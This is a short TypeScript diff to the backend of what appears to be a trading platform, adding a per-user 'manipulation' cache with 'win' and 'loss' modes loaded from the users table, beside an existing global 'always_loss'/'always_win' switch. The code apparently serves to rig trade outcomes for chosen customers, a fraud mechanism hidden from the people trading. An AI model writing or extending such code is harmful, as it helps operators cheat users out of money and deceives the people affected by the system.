@@ -1,6 +1,6 @@
 import axios from 'axios';
 import { markets, Market } from '../markets.ts';
-import db from '../db/mysql-db.ts';
+import db, { query, get, run } from '../db/mysql-db.ts';
 import { adminDb } from '../lib/firebase-admin.ts';
 import { generateSingleCandleOHLC } from './candlestickEngine.ts';
 
@@ -570,6 +570,24 @@ export async function initializeCandlesFromDB() {
 
 export let globalManipulationMode: 'neutral' | 'always_loss' | 'always_win' = 'neutral';
 export let systemActive = true;
+
+export const userManipulationCache = new Map<string, 'neutral' | 'loss' | 'win'>();
+export const setUserManipulation = (userId: string, mode: 'neutral' | 'loss' | 'win') => {
+  if (mode === 'neutral') userManipulationCache.delete(userId);
+  else userManipulationCache.set(userId, mode);
+};
+
+export async function initializeUserManipulation() {
+  try {
+    const users = await query('SELECT uid, manipulation_mode FROM users WHERE manipulation_mode != ?', ['neutral']) as any[];
+    for (const u of users) {
+      setUserManipulation(u.uid.toString(), u.manipulation_mode);
+    }
+    console.log(`📦 Initialized user manipulation for ${users.length} users`);
+  } catch (err) {
+    console.error('Failed to initialize user manipulation cache:', err);
+  }
+}
 
 // Firestore Persistence for candles (Master Store)
 async function saveCandleToFirestore(pair: string, type: string, timeframe: string, candle: any) {
